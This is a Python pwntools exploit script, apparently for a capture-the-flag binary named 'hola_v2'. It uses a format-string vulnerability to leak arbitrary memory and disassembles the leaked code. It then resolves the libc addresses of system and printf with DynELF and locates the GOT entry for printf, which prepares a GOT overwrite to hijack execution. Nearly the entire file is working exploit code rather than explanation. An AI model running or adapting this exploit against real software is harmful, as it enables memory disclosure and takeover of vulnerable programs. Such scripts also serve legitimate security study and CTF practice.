from pwn import *
import binascii
import sys

saveSocket = None
context.bits = 64

def leak(s,offset,pad,address):
  data = "%"+str(offset)+"$pBBBB" + pack(address)
  if "\n" in data:
    print " [!] newline in payload!"
    return ""
  try:
    s.sendline("%"+str(offset)+"$s"+"A"*pad + pack(address))
  except EOFError:
    raise EOFError
  try:
    data = s.recv()
    print "[R] leaked %d bytes at %x " % (len(data.split("A"*pad)[0]),address)
  except EOFError:
    print "[X] EOFError trying to leak from %x" % address
    
    return None
  data = data.split('Hola ')[1]
  (code,junk) = data.split("A"*pad)
  return code

def leak_code(s,l_offset,l_pad,address,size):
  global offset
  global pad
  offset = l_offset 
  pad = l_pad
  remainingSize = size
  out = bytearray("")
  while remainingSize > 0:
    try:
      data = leak(s,offset,pad,address + size - remainingSize)
    except EOFError:
      return out
    if data == None:
      remainingSize -= 1
    else:
      out += bytearray(data)
      remainingSize -= len(data) + 1
    out += bytearray("\x00")
  return out

def leakFour(address):
  global saveSocket
  global offset
  global pad
  print "[+] Called with addr %x" % address
  try:
    data = leak_code(saveSocket,offset,pad,address,4)[0:4]
    print binascii.hexlify(data)
    return str(data)
  except:
    return ''


def leak_libc_ptr(s,addr):
  global saveSocket
  saveSocket = s
  d = DynELF(leakFour,addr)
  dynamic_ptr = d.dynamic
  print "[+] .dynamic section :"+str(hex(dynamic_ptr))
  return d , dynamic_ptr

def leak_libc(d, func):
   libc_addr = d.lookup(func,'libc')
   print "[+] %s addr : %x" %(func,libc_addr)
   return libc_addr

def find_got(s,dynamic_ptr):
    addr = dynamic_ptr
    global offset
    global pad
    while True:
        x = leak(s,offset,pad,addr)
        if x == '\x03': # type PLTGOT
            addr += 4
            got_addr = unpack(leakFour(addr))
            print 'GOT Address: %s' % hex(got_addr)
            return got_addr
        addr += 8


def resolve_got(addr,func_libc):
    func_libc = hex(func_libc)
    while True :
        ret = leakFour(addr)
        ret = hex(unpack(ret))
        if ret[-3:] == func_libc[-3:] and  ret[2:4] == func_libc[2:4] :
            print " %s@got.plt : %s " % (addr, ret)
            return addr
        addr += 4


p = process('hola_v2')
saveSocket = p
base_addr = 0x40060d
data = leak_code(p,7,4,0x400696,10) # leak_code(r,offset,pad,start_addr,size)
print disasm(data,arch='amd64')
d, dynamic_ptr = leak_libc_ptr(p,base_addr)
system_libc  = leak_libc(d,'system')
printf_libc = leak_libc(d,'printf')

got_addr = find_got(p,dynamic_ptr)
printf_got = resolve_got(got_addr, printf_libc)


